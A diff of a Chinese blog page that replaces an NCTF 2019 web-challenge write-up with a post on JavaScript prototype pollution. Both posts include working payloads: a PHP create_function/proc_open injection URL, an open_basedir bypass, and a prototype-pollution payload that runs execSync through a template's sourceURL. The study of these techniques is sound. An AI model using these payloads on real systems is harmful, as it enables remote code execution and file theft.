@@ -96,31 +96,27 @@
 
 
 
-  <meta name="description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用cre">
+  <meta name="description" content="JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。 0x00 JavaScript继承机制在JavaScript中，几乎所有的事物都是对象。 创造对象的方法： 123456789var o = &amp;#123;a:1,b:2&amp;#125;;         //直接定义一个对象o 且该对象具有a和b两个属性o = new Object();          //new一个对">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2019NCTFweb部分复现">
-<meta property="og:url" content="http://yoursite.com/year/11/29/2019NCTF/index.html">
+<meta property="og:title" content="回炉重造计划——JavaScript学习小结">
+<meta property="og:url" content="http://yoursite.com/year/03/04/JavaScript/index.html">
 <meta property="og:site_name" content="Yiyangqianxixxxx">
-<meta property="og:description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用cre">
+<meta property="og:description" content="JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。 0x00 JavaScript继承机制在JavaScript中，几乎所有的事物都是对象。 创造对象的方法： 123456789var o = &amp;#123;a:1,b:2&amp;#125;;         //直接定义一个对象o 且该对象具有a和b两个属性o = new Object();          //new一个对">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126113715.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126115609.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126121939.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126123205.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128120953.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121139.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121357.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121602.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122058.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128104532.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122255.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128123214.png">
-<meta property="og:updated_time" content="2019-12-14T09:46:00.643Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583225140097.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583226858538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583228279309.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583301386615.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583301539125.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583302023884.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583301964010.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day1/1583302732357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day1/1583302786135.png">
+<meta property="og:updated_time" content="2020-03-04T10:09:27.372Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2019NCTFweb部分复现">
-<meta name="twitter:description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用cre">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png">
+<meta name="twitter:title" content="回炉重造计划——JavaScript学习小结">
+<meta name="twitter:description" content="JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。 0x00 JavaScript继承机制在JavaScript中，几乎所有的事物都是对象。 创造对象的方法： 123456789var o = &amp;#123;a:1,b:2&amp;#125;;         //直接定义一个对象o 且该对象具有a和b两个属性o = new Object();          //new一个对">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583225140097.png">
 
 
 
@@ -128,7 +124,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/year/11/29/2019NCTF/">
+  <link rel="canonical" href="http://yoursite.com/year/03/04/JavaScript/">
 
 
 
@@ -138,7 +134,7 @@
   };
 </script>
 
-  <title>2019NCTFweb部分复现 | Yiyangqianxixxxx</title>
+  <title>回炉重造计划——JavaScript学习小结 | Yiyangqianxixxxx</title>
   
 
 
@@ -374,7 +370,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/year/11/29/2019NCTF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/year/03/04/JavaScript/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yan">
@@ -391,7 +387,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2019NCTFweb部分复现
+          <h1 class="post-title" itemprop="name headline">回炉重造计划——JavaScript学习小结
 
               
             
@@ -417,24 +413,12 @@
                 
               
 
-              <time title="创建时间：2019-11-29 08:28:25" itemprop="dateCreated datePublished" datetime="2019-11-29T08:28:25+08:00">2019-11-29</time>
+              <time title="创建时间：2020-03-04 18:00:00 / 修改时间：18:09:27" itemprop="dateCreated datePublished" datetime="2020-03-04T18:00:00+08:00">2020-03-04</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-12-14 17:46:00" itemprop="dateModified" datetime="2019-12-14T17:46:00+08:00">2019-12-14</time>
               
             
           </span>
@@ -451,7 +435,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF复现/" itemprop="url" rel="index"><span itemprop="name">CTF复现</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/总结记录/" itemprop="url" rel="index"><span itemprop="name">总结记录</span></a></span>
 
                 
                 
@@ -470,8 +454,8 @@
                 </span>
             
                 <span class="post-meta-item-text">评论数：</span>
-                <a href="/year/11/29/2019NCTF/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/year/11/29/2019NCTF/" itemprop="commentCount"></span>
+                <a href="/year/03/04/JavaScript/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/year/03/04/JavaScript/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -479,7 +463,7 @@
 
           
           
-            <span id="/year/11/29/2019NCTF/" class="leancloud_visitors" data-flag-title="2019NCTFweb部分复现">
+            <span id="/year/03/04/JavaScript/" class="leancloud_visitors" data-flag-title="回炉重造计划——JavaScript学习小结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
@@ -504,7 +488,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2.4k</span>
+                <span title="本文字数">2.9k</span>
               
 
               
@@ -518,7 +502,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">2 分钟</span>
+                <span title="阅读时长">3 分钟</span>
               
             </div>
           
@@ -538,42 +522,59 @@
       
 
       
-        <a id="more"></a>
-<h3 id="hackbackdoor"><a href="#hackbackdoor" class="headerlink" title="hackbackdoor"></a>hackbackdoor</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png" alt></p>
-<p>题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126113715.png" alt></p>
-<p>但是直接用参数拼接的方法比较容易写错，可以使用create_function创建一个方法，把方法执行的代码内容写在post里，这样比较方便。所以构造url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60004/?code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure>
-<p>post内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=$cmd=&apos;../../.././readflag&apos;;</span><br><span class="line">$descriptorspec=array(array(&apos;pipe&apos;,&apos;r&apos;) ,array(&apos;pipe&apos;,&apos;w&apos;) ,array(&apos;pipe&apos;,&apos;w&apos;)</span><br><span class="line">);</span><br><span class="line">$handle=proc_open($cmd, $descriptorspec, $p);</span><br><span class="line">var_dump(stream_get_contents($p[1]));</span><br><span class="line">proc_close($handle);</span><br></pre></td></tr></table></figure>
-<h3 id="flaskwebsite"><a href="#flaskwebsite" class="headerlink" title="flaskwebsite"></a>flaskwebsite</h3><p>这题的知识点之前没有学习过，是有关于flask debug pin码的安全问题。flask在debug模式下会生成一个debugger pin，通过这个pin码可以在报错页面执行任意python代码。这里有篇文章专门讲解了这方面的问题 <a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">文章链接</a></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126115609.png" alt></p>
-<p>而这个pin码是可以通过搜集机器上的一些信息来生成的，所以配合一个任意文件读取的功能就可以实现代码执行的功能了。所以只要根据文章的内容来提取出需要的信息，就可以构造出题目机器上的pin。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username  #也就是运行当前flask的用户，可以通过etc/passwd来得到</span><br><span class="line"></span><br><span class="line">modname  #flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &apos;__file__&apos;, None) # flask目录下的一个app.py的绝对路径</span><br><span class="line"></span><br><span class="line">uuid.getnode() # mac地址十进制/sys/class/net/eth0/address</span><br><span class="line"></span><br><span class="line">get_machine_id() # /etc/machine-id 或 /proc/sys/kernel/random/boot_id</span><br></pre></td></tr></table></figure>
-<p>但这题有一个不一样的点，因为是docker起的服务，所以读机器id没有用，要读docker容器id，通过路径 /proc/self/cgroup来读取</p>
-<p>用脚本跑出来pin然后直接在报错页面执行python代码读文件就行了</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126121939.png" alt></p>
-<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126123205.png" alt></p>
-<p>第一个num可以用%0a绕过,第二个条件只要string1和string2的md5值是以0e开头，并且内容中 包含cxhp四个字母就可以令他们相等了。第三个条件是要传入的参数q_w_q中不能含有’_’或者url编码后的%57，但是下划线 _可以用.代替，所以传入参数q.w.q。</p>
-<h3 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128120953.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121139.png" alt></p>
-<p>根据题目提示vim可以想到有.swp文件泄露，测试发现文件catchmine.php.swp，恢复后文件内容如下</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121357.png" alt></p>
-<p>题目意思很明确，就是curl_exec实现任意文件读取，要触发curl必须先满足careful反序列化后执行函数funny_get()得到1，这个很简单，直接构造</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121602.png" alt></p>
-<p>而Main类要怎么实现反序列化，可以通过getimagesize(phar://文件路径)来触发，所以利用点也就明确了，上传一个phar文件并且类型设置为jpeg或gif，得到上传后的路径填入name中。要任意读取的文件可以通过Main类的url属性来设置。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122058.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128104532.png" alt></p>
-<p>得到一个内网网址10.0.0.3，访问后得到</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122255.png" alt></p>
-<p>提示10.0.0.3由php-fpm，所以可以想到利用ssrf+gopher</p>
-<p><a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher" target="_blank" rel="noopener">参考链接</a></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128123214.png" alt></p>
-<p>由于这一题的php-fpm在10.0.0.3上，所以要把开头的gopher://127.0.0.1改为gopher://10.0.0.3，而且这题不需要二次url编码。</p>
-<p>后面的内容因为题目环境关了，所以没有截图，只能口诉。</p>
-<p>后面访问phpinfo后会发现禁用了很多函数，而且限制了open_basedir，但是可以绕过，可用php代码为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&apos;/tmp/fuck&apos;);chdir(&apos;/tmp/fuck&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(scandir(&apos;/&apos;));readfile(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/YsMnLpUAnOolblXHVfCk8w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YsMnLpUAnOolblXHVfCk8w</a></p>
+        <p>JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。</p>
+<h4 id="0x00-JavaScript继承机制"><a href="#0x00-JavaScript继承机制" class="headerlink" title="0x00 JavaScript继承机制"></a>0x00 JavaScript继承机制</h4><p>在JavaScript中，几乎所有的事物都是对象。</p>
+<p>创造对象的方法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;;         <span class="comment">//直接定义一个对象o 且该对象具有a和b两个属性</span></span><br><span class="line">o = <span class="keyword">new</span> <span class="built_in">Object</span>();          <span class="comment">//new一个对象（滑稽</span></span><br><span class="line">fuction o(a,b,c,d)&#123;</span><br><span class="line">	<span class="keyword">this</span>.a = a;</span><br><span class="line">	<span class="keyword">this</span>.b = b;</span><br><span class="line">	<span class="keyword">this</span>.c = c;</span><br><span class="line">	<span class="keyword">this</span>.d = d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> o1 = <span class="keyword">new</span> o(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);     <span class="comment">//使用类构造器</span></span><br></pre></td></tr></table></figure>
+<p>但是如果是通过类构造器生成的对象，其对象不能直接添加新属性，只能通过在构造器中添加。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583225140097.png" alt></p>
+<p>可以看到我定义了一个person类，然后实例化了该类并对其属性赋值，对student对象进行输出后，可以看到输出了该对象的内容，并且有一个自带的属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__proto__:Object                          //这个属性可以用来访问person类的原型</span><br></pre></td></tr></table></figure>
+<p>可以再看下面我直接对person类新增加了一个属性 phone ，但我直接输出student.phone的时候却显示了undefined，说明不能直接对类来新增属性。</p>
+<p>所以就有 prototype 继承这一概念，所有的JavaScript对象都会从一个prototype（原型对象）中继承属性和方法，所有JavaScript中的对象都是位于原型链顶端的Object的实例。</p>
+<p>我们可以通过 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.prototype.phone = 123;</span><br></pre></td></tr></table></figure>
+<p>来为person类新增一个phone属性，其值为123，再访问student.phone看看。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583226858538.png" alt></p>
+<p>也可以通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">student.__proto__.phone = 123;</span><br></pre></td></tr></table></figure>
+<p>来新增phone属性。</p>
+<p>接下来看一个小Demo：</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583228279309.png" alt></p>
+<p>当我们对foo的原型对象的属性进行修改后，所有继承该原型对象的对象都会有该属性的值。</p>
+<p>但为什么foo的属性还是不变呢？</p>
+<p>因为对于对象foo，在调用foo.bar的时候，实际上JavaScript引擎会进行如下操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、在对象foo中寻找bar</span><br><span class="line">2、如果找不到，则在foo.__prot__中寻找bar</span><br><span class="line">3、如果仍然找不到，则在foo.__proto__.__proto__中寻找bar</span><br><span class="line">4、依次寻找，找到找到null结束。</span><br></pre></td></tr></table></figure>
+<p>所以调用foo.bar的时候直接找到了，就返回1。</p>
+<p>以上的内容可以得到几个结论：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、每个类构造器都有一个原型对象prototype</span><br><span class="line">2、对象的__proto__指向类的原型对象prototype</span><br><span class="line">3、JavaScript使用prototype链实现继承机制</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-JavaScript原型链污染"><a href="#0x01-JavaScript原型链污染" class="headerlink" title="0x01 JavaScript原型链污染"></a>0x01 JavaScript原型链污染</h4><p>先看代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
+<p>merge函数用于合并对象的属性，上面的输出为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
+<p>为什么o3.b会是undefined呢？ 按理说设置了 o2的原型对象的属性b为2，o3继承后应该也有b属性。</p>
+<p>但这里却没有继承到。</p>
+<p>其实是因为原型对象  此时并没有作为键值key，而是作为了o2本身，相当于给o2添加了一个属性b=2，而不是给Object添加了属性。</p>
+<p>所以要怎么才能达到污染原型链的操作，来让o3.b输出2呢？</p>
+<p>只要将代码修改如下：</p>
+ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;a: 1,"__proto__":&#123;b:2&#125;&#125;'</span>)</span><br><span class="line">merge(o1,o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a,o1.b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
+<p>这样就能解析为键值，给原型对象添加属性b=2了。</p>
+<h4 id="0x02-codebreaking-——thejs"><a href="#0x02-codebreaking-——thejs" class="headerlink" title="0x02 codebreaking ——thejs"></a>0x02 codebreaking ——thejs</h4><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583301386615.png" alt></p>
+<p>这里看到了一个敏感函数 merge ，也就是上文提到的合并函数，只要其中的一个变量可控，我们就可以完成原型链污染，刚好这个req.body就是我们post传参的值，所以我们就要找到一个可利用的属性来完成更多的攻击。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583301539125.png" alt></p>
+<p>这里会执行一个模板引擎，跟进template</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583302023884.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1583301964010.png" alt></p>
+<p>发现其中sourceURL取自options的属性sourceURL，而这个属性是没有赋值的，也就是说当调用options的属性sourceURL时会找不到，然后去它的原型对象 也就是object里找，所以我们就可以完成一条利用链。</p>
+<p>req.body –&gt; data –&gt;  Object.sourceURL –&gt;  new Function()</p>
+<p>return Function是动态函数，其中可以直接定义参数和函数体，只要我们在sourceURL中插入恶意代码即可完成命令执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;id&apos;)&#125;\n//&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>前面的 return e … delete … 其实加不加无所谓，主要是在比赛中，如果大家使用同一个服务器，你污染了原型链输出flag，所有人都能得到flag（除非服务重启）。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day1/1583302732357.png" alt></p>
+<p>但在后面的nodejs版本中，已经对template中的sourceURL的赋值进行了过滤，代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day1/1583302786135.png" alt></p>
+<p>可以看到吧\r\n都替换为空了，所以前面的注释就无法绕过了。</p>
+<p>头脑比较乱，说的可能不太清楚，仅作记录。</p>
 
       
     </div>
@@ -604,8 +605,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/year/11/27/docker日常使用命令记录/" rel="next" title="docker日常使用命令记录">
-                <i class="fa fa-chevron-left"></i> docker日常使用命令记录
+              <a href="/year/03/04/java反序列化/" rel="next" title="java反序列化学习">
+                <i class="fa fa-chevron-left"></i> java反序列化学习
               </a>
             
           </div>
@@ -613,10 +614,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/year/12/12/thinkphp合集/" rel="prev" title="thinkphp合集">
-                thinkphp合集 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -752,7 +749,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#hackbackdoor"><span class="nav-number">1.</span> <span class="nav-text">hackbackdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flaskwebsite"><span class="nav-number">2.</span> <span class="nav-text">flaskwebsite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyphp"><span class="nav-number">3.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-matches-everything"><span class="nav-number">4.</span> <span class="nav-text">phar matches everything</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-JavaScript继承机制"><span class="nav-number">1.</span> <span class="nav-text">0x00 JavaScript继承机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-JavaScript原型链污染"><span class="nav-number">2.</span> <span class="nav-text">0x01 JavaScript原型链污染</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-codebreaking-——thejs"><span class="nav-number">3.</span> <span class="nav-text">0x02 codebreaking ——thejs</span></a></li></ol></div>
             
 
           </div>
